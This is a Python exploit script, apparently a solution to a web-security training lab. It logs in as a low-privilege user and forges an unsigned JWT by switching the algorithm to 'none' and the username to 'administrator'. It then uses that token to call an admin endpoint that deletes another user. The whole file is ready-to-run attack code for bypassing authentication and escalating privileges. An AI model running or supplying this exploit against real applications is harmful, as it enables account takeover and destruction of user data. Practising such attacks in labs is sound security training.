import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import jwt
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'})['value']
    return csrf

def login(url, s, username, password):

    # Extract the csrf token
    login_url = url + '/login'
    csrf_token = get_csrf_token(s, login_url)

    # Login as the user
    print("(+) Logging in as the user " + username + "....")
    login_params = {'csrf': csrf_token, 'username': username, 'password': password}
    r = s.post(login_url, data=login_params, verify=False, proxies=proxies, allow_redirects=False)

    if r.status_code == 302:
        print("(+) Login is successful.")
        jwt = r.cookies['session']
        return jwt
    else:
        print("(-) Login not successful.")
        sys.exit(-1)

def jwt_sig_verifiction_attack(url, token):

    # Extract content of jwt
    header, payload, signature = token.split(".")

    # Modifying the header
    decoded_header = base64.urlsafe_b64decode(header + "=" * (-len(header) %4))
    modified_header = decoded_header.replace(b'RS256', b'none')

    # Modifying the payload
    decoded_payload = base64.urlsafe_b64decode(payload + "=" * (-len(payload) %4))
    modified_payload = decoded_payload.replace(b'wiener', b'administrator')
    print(modified_payload)

    # Create new administrator token
    modified_header_encoded = base64.urlsafe_b64encode(modified_header).decode("utf-8")
    modified_payload_encoded = base64.urlsafe_b64encode(modified_payload).decode("utf-8")
    modified_token = f"{modified_header_encoded}.{modified_payload_encoded}."
    print("(+) Generated the administrator token.")

    # Use new token to delete user
    print("(+ Attempting to delete the user Carlos...)")
    cookies = {'session': modified_token}
    delete_carlos_url = url + '/admin/delete?username=carlos'
    r = requests.get(delete_carlos_url, cookies=cookies, verify=False, proxies=proxies)
    res = r.text
    if "User deleted successfully" in res:
        print("(+) Successfully deleted the Carlos user!")
    else:
        print("(-) Attack was unsuccessful.")

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    regular_username = "wiener"
    regular_password = "peter"

    s = requests.Session()

    regular_user_jwt = login(url, s, regular_username, regular_password)

    if (regular_user_jwt):

        jwt_sig_verifiction_attack(url, regular_user_jwt)

if __name__ == "__main__":
    main()